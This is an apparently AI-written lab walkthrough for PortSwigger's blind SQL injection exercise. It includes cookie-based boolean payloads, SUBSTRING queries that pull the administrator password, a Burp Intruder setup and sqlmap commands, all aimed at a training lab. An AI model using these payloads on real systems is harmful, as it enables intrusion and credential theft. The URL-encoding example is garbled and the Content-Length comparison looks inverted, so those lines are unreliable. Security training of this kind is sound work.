Here’s the revised version with larger headers for each step, structured for clarity and alignment with your preferred format:

---

## **Guided Lab: Blind SQL Injection**

### **Lab URL**:

[Blind SQL Injection Lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

---

### **Lab Objective**

Exploit a **blind SQL injection vulnerability** in the `TrackingId` cookie to extract the password for the `administrator` user.

---

### **PortSwigger Solution Steps**

---

### **Step 1: Intercept the Request**

- Use **Burp Suite** to capture the HTTP request containing the `TrackingId` cookie.
- Example request:
    
```http
Cookie: TrackingId=xyz
```
    

---

### **Step 2: Test Boolean-Based Injection**

- Modify the `TrackingId` cookie with true and false conditions:
    - **True Condition**:
        
        ```sql
        TrackingId=xyz' AND '1'='1
        ```
        
        - Expected Result: `Welcome back` message appears.
    - **False Condition**:
        
        ```sql
        TrackingId=xyz' AND '1'='2
        ```
        
        - Expected Result: No `Welcome back` message.
- Confirms the application is vulnerable to **blind SQL injection**.

---

### **Step 3: Verify Table Existence**

- Test for the presence of the `users` table:
    
    ```sql
    TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
    ```
    

---

### **Step 4: Identify the `administrator` User**

- Confirm the existence of the `administrator` username:
    
    ```sql
    TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
    ```
    

---

### **Step 5: Determine Password Length**

- Incrementally test the password length using payloads like:
    
    ```sql
    TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>X)='a
    ```
    
- Repeat until the condition is false to find the exact length (e.g., 20 characters).

---

### **Step 6: Extract Password Characters**

- Use the `SUBSTRING` function to extract each character:
    
    ```sql
    TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
    ```
    
    - Change `1,1` to test subsequent positions.
    - Repeat until the entire password is extracted.

---

### **Step 7: Automate Extraction with Burp Intruder**

1. **Setup Positional Markers**:
    
    - Modify the request:
        
```http
Cookie: TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
```
        
    - Place markers around the substring position (`1`) and character (`a`).
2. **Configure Payloads**:
    
    - **Payload Set 1** (Position): Numbers `1-20`.
    - **Payload Set 2** (Characters): Alphanumeric (`a-z`, `0-9`).
3. **Add Grep-Match**:
    
    - Add `Welcome back` to match valid responses.
4. **Analyze Results**:
    
    - Identify the valid payload for each position based on the `Welcome back` response.

---

### **Step 8: Log in as Administrator**

- Use the extracted password to log in and complete the lab.

---

# **Instructor Lab Notes**

---

### **Step 1: Generate Traffic**

- Browse the application to generate traffic and capture it with **Burp Suite**.

---

### **Step 2: Initial Testing**

- Send the request to **Repeater** and test payloads manually:
    
```http
GET /filter?category=Pets' AND 1=1-- -
```
    
- **URL Encode** payloads if required:
    
```http
GET /filter?category=Pets'+AND+%3d11=1--+-
```
    

---

### **Step 3: Compare Responses**

- Observe **Content-Length** changes:
    - No payload: `5338`.
    - True condition: `5277`.
    - False condition: `5338`.

---

### **Step 4: Use Comparer**

- Test payloads:
    
    ```sql
    ' AND 1='1
    ```
    
    and
    
    ```sql
    ' AND 1='2
    ```
    
- Analyze differences in responses using **Comparer**.

---

### **Step 5: Automate Testing with sqlmap**

1. **Save the Request**:
    - Save to a file (`req.txt`):
        
```bash
$ sqlmap -r req.txt --level 2 --dbs
```
        
2. **Adjust Parameters**:
    - Increase risk level if necessary:
        
```bash
$ sqlmap -r req.txt --level 2 --risk 3 --dbs --batch
```
        
3. **Verify URL Encoding**:
    - Check if manual testing requires encoding.

---

### **Step 6: Extract Password Manually**

- Use **SUBSTRING** for manual character-by-character extraction:
    
```sql
AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```
    

---

### **Tools Used**

---

### **Burp Suite**

- **Repeater**: For manual payload testing.
- **Comparer**: For identifying differences in response length or content.
- **Intruder**: For automating payload testing.

---

### **sqlmap**

- Automates SQL injection testing and payload execution.
- Handles encoding, risk levels, and detailed testing.

---

### **Key Concepts**

---

### **Blind SQL Injection**

- Relies on observing behavioral changes, such as `Welcome back` messages or `Content-Length`, instead of direct data output.

---

### **Boolean-Based Injection**

- Uses true/false conditions to infer query success.

---

### **SUBSTRING Function**

- Extracts parts of a string:
    
```sql
SUBSTRING('password', 1, 1)
```
    

---

### **URL Encoding**

- Ensures special characters are safely transmitted in HTTP requests.

---

### **Content-Length**

- A crucial metric for detecting injection success.

---

### **Interview Questions**

1. **What is blind SQL injection, and how does it differ from classic SQLi?**
2. **Why is `Content-Length` important in detecting SQL injection?**
3. **How does the `SUBSTRING` function help in SQLi exploitation?**
4. **What tools would you use to automate SQL injection?**

---
#SQLInjection #blindsqli #comprarer #token